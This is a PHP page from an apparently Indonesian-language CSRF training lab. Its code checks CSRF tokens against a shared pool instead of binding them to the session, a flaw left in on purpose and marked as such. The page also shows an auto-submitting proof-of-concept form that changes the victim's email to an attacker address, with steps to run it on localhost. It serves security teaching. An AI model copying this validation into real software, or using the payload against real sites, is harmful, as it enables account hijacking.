<?php
$title = 'Lab 2: Token CSRF tidak diikat ke session';
require_once __DIR__ . '/lib.php';
$db = load_db();
$msg = '';
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $token = $_POST['csrf_token'] ?? '';
    // VULNERABLE: only checks that the token was issued by the server at
    // SOME point ("is it in the valid pool?"), never that it belongs to the
    // session that is currently making the request.
    if (in_array($token, $db['valid_tokens'] ?? [], true)) {
        $db['user']['email'] = $_POST['email'] ?? $db['user']['email'];
        save_db($db);
        $db = load_db();
        $msg = 'Email berhasil diubah menjadi ' . htmlspecialchars($db['user']['email']);
    } else {
        $error = 'Token CSRF tidak valid.';
    }
}

// Issue a fresh token for the form rendered on THIS page load - anyone who
// loads this page (including the attacker, in their own browser/session)
// gets a token that will pass validation for anyone.
$new_token = bin2hex(random_bytes(8));
$db['valid_tokens'][] = $new_token;
$db['valid_tokens'] = array_slice($db['valid_tokens'], -20);
save_db($db);

include 'header.php';
if (!is_logged_in()) { echo '<div class="error-box">Login dulu sebagai victim, lalu buka lab ini lagi.</div>'; include 'footer.php'; exit; }

$poc = <<<HTML
<html>
<body onload="document.forms[0].submit()">
<form action="http://localhost:8079/csrf/lab2_token_not_tied.php" method="POST">
  <input type="hidden" name="email" value="attacker-owns-this@evil.test">
  <input type="hidden" name="csrf_token" value="__PASTE_YOUR_OWN_TOKEN_HERE__">
</form>
</body>
</html>
HTML;
?>

<details class="hint-box">
<summary>Lihat Hint</summary>
<p class="hint">Goal: form ini SUDAH punya token CSRF (bukan seperti Lab 1) &mdash; tapi server
cuma mengecek "apakah token ini pernah diterbitkan oleh server", bukan "apakah token ini
diterbitkan untuk session yang sedang mengirim request ini". Langkahnya:</p>
<ol class="hint">
<li>Buka halaman ini di jendela/browser terpisah TANPA login (berperan sebagai attacker) untuk
mendapatkan token valid milikmu sendiri &mdash; lihat nilai <code>csrf_token</code> di form di
bawah.</li>
<li>Tempelkan token itu ke PoC HTML, ganti <code>__PASTE_YOUR_OWN_TOKEN_HERE__</code>.</li>
<li>Jalankan <code>python3 -m http.server 9000</code> dari folder PoC, buka
<code>http://localhost:9000/exploit.html</code> di tab yang sudah login sebagai victim.</li>
</ol>
</details>

<p>Email saat ini: <strong><?php echo htmlspecialchars($db['user']['email']); ?></strong></p>
<?php if ($msg): ?><div class="ok-box"><?php echo $msg; ?></div><?php endif; ?>
<?php if ($error): ?><div class="error-box"><?php echo htmlspecialchars($error); ?></div><?php endif; ?>

<h3>Form ubah email (legit, token valid untuk siapa saja yang memuat halaman ini)</h3>
<form method="post">
  <input type="text" name="email" value="<?php echo htmlspecialchars($db['user']['email']); ?>">
  <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars($new_token); ?>">
  <p class="hint">Token yang baru diterbitkan untuk request ini: <code><?php echo htmlspecialchars($new_token); ?></code></p>
  <button type="submit">Update Email</button>
</form>

<h3>PoC HTML (halaman attacker)</h3>
<textarea readonly rows="8" style="width:100%;font-family:monospace;"><?php echo htmlspecialchars($poc); ?></textarea>

<?php include 'footer.php'; ?>
